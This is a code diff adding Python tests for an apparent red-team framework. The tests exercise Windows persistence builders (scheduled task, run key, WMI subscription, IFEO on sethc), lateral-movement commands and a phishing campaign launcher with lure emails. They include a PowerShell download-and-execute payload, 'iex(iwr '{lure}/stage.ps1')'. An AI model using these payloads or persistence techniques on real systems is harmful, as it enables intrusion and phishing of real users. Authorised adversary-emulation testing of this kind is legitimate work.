@@ -373,6 +373,62 @@ _PACK_SKELETON = """{
 }
 """
 
+# ─── APT mode: persistence builders + new lateral kinds ───
+
+
+def test_persistence_kinds_render():
+    from cf.persistence import KINDS, command
+
+    assert set(KINDS) == {
+        "schtask", "run-key", "startup-lnk", "wmi-sub", "service", "ifeo",
+    }
+    for kind in KINDS:
+        out = command(kind, payload="iex(iwr '{lure}/s')", target="sethc")
+        assert out["command"].strip(), kind
+        assert out["command"].count("{name}") == 0, kind
+        assert out["mitre"].startswith("T"), kind
+        assert out["telemetry"].strip(), kind
+        assert out["opsec"].strip(), kind
+
+
+def test_persistence_unknown_fails_closed():
+    from cf.persistence import command
+
+    with pytest.raises(KeyError):
+        command("nope")
+
+
+def test_persistence_cli(tmp_path):
+    from cf.cli import Cli
+
+    db = str(tmp_path / "p.db")
+    assert Cli(["--db", db, "persist", "list"]).run() == 0
+    assert Cli(
+        ["--db", db, "persist", "schtask",
+         "--name", "EdgeUpdate", "--payload", "echo hi"]
+    ).run() == 0
+    assert Cli(["--db", db, "persist", "bootkit"]).run() == 1
+
+
+def test_persistence_command_embeds_lure():
+    from cf.persistence import command
+
+    out = command("schtask", payload="iex(iwr '{lure}/stage.ps1')")
+    assert "'{lure}/stage.ps1'" in out["command"]
+
+
+def test_new_lateral_kinds_render():
+    from cf.lateral import KINDS, command
+
+    for kind in ("service", "dcom", "shares"):
+        assert kind in KINDS
+        out = command(
+            kind, "10.0.0.5", payload="cmd /c whoami", value="SvcHost"
+        )
+        assert out["command"].strip(), kind
+        assert out["mitre"].startswith("T"), kind
+        assert out["command"].count("{") == 0, kind
+
 
 def test_user_template_pack_dir(tmp_path, monkeypatch):
     from cf import generator as gen
@@ -461,7 +517,128 @@ def test_write_bundle_emits_mail_artifacts(tmp_path):
     assert "lure-1.html" in written
 
 
-# ─── webhooks + proxy sessions + new packs ───
+# ─── wave 2: campaign launch + gui pack editor ───
+
+
+def test_campaign_launch_no_serve(tmp_path):
+    """Full kill chain offline: dead smtp hop fails closed, campaign +
+    targets + bundle still land; --no-serve keeps the test synchronous."""
+    from cf.cli import Cli
+
+    db = str(tmp_path / "l.db")
+    extra = tmp_path / "p"
+    extra.mkdir()
+    (extra / "mytemplate.json").write_text(_PACK_SKELETON, encoding="utf-8")
+    out = tmp_path / "kit"
+    assert (
+        Cli(
+            ["--db", db, "campaign", "launch", "mytemplate",
+             "--pack-dir", str(extra), "--seed", "9",
+             "--email", "a@corp.tld,b@corp.tld",
+             "--host", "127.0.0.1", "--port", "1", "--from", "ops@corp.tld",
+             "--no-serve", "--out", str(out)]
+        ).run()
+        == 0
+    )
+    from cf.store import Store
+
+    store = Store(db)
+    camps = store.list_campaigns()
+    assert camps and camps[0]["name"] == "Template personnalisé"
+    rows = store.targets(camps[0]["id"])
+    # dead hop → fail closed, both marked dead, no phantom 'delivered'
+    assert [t["status"] for t in rows] == ["dead", "dead"]
+    assert len(list(out.glob("*.eml"))) == 1
+    assert (out / "bundle.json").is_file()
+    store.close()
+
+
+def test_campaign_launch_requires_profile_and_email(tmp_path):
+    from cf.cli import Cli
+
+    db = str(tmp_path / "l2.db")
+    assert (
+        Cli(["--db", db, "campaign", "launch", "colis"]).run() == 1
+    )
+    assert Cli(["--db", db, "campaign", "launch", "junk-pack",
+                "--profile", "nope", "--email", "a@b.tld"]).run() == 1
+
+
+def test_gui_pack_editor_routes(tmp_path, monkeypatch):
+    """GET lists, GET ?id returns the raw pack, POST validates fail-closed
+    and persists a good pack into USER_PACK_DIR (monkeypatched)."""
+    import asyncio
+
+    from cf import generator as gen
+    from cf.gui import RedveilGUI
+    from cf.store import Store
+
+    store = Store(str(tmp_path / "g.db"))
+    user_dir = tmp_path / "u"
+    user_dir.mkdir()
+    monkeypatch.setattr(gen, "USER_PACK_DIR", user_dir)
+    gui = RedveilGUI(store, auth=False)
+
+    def req(method="GET", pid="", body=None):
+        class R:
+            query = {"id": pid}
+
+            async def json(self):
+                return body
+
+        r = R()
+        r.method = method
+        return r
+
+    listed = json.loads(asyncio.run(gui.api_packs(req())).text)
+    assert "colis" in listed["all"]
+    raw = json.loads(asyncio.run(gui.api_packs(req(pid="colis"))).text)
+    assert raw["pack"]["id"] == "colis"
+
+    good = json.loads(
+        _PACK_SKELETON.replace('"mytemplate"', '"hrtuple"')
+    )
+    saved = asyncio.run(gui.api_packs(req("POST", "", good)))
+    assert saved.status == 200
+    assert (user_dir / "hrtuple.json").is_file()
+
+    bad = {"id": "brok", "label": "x"}
+    rejected = asyncio.run(gui.api_packs(req("POST", "", bad)))
+    assert rejected.status == 400
+    assert not (user_dir / "brok.json").exists()
+
+    bad_id = {"id": "WRONG ID", "label": "x"}
+    assert asyncio.run(gui.api_packs(req("POST", "", bad_id))).status == 400
+    store.close()
+
+
+def test_gui_pack_preview(tmp_path, monkeypatch):
+    """Preview renders a lure without persisting any pack file."""
+    import asyncio
+    import re
+
+    from cf import generator as gen
+    from cf.gui import RedveilGUI, USER_PREVIEW_DIR
+    from cf.store import Store
+
+    store = Store(str(tmp_path / "gp.db"))
+    monkeypatch.setattr(gen, "USER_PACK_DIR", tmp_path / "u2")
+    monkeypatch.setattr("cf.gui.USER_PREVIEW_DIR", tmp_path / "pv")
+    gui = RedveilGUI(store, auth=False)
+
+    class R:
+        method = "POST"
+        query = {"id": ""}
+
+        async def json(self):
+            return json.loads(_PACK_SKELETON)
+
+    resp = asyncio.run(gui.api_pack_preview(R()))
+    assert resp.content_type == "text/html"
+    assert "https://" in resp.text
+    # nothing persisted — the throwaway preview dir is wiped
+    assert not list((tmp_path / "pv").glob("**/*.json"))
+    store.close()
 
 
 def test_webhook_crud_and_failures(tmp_path):
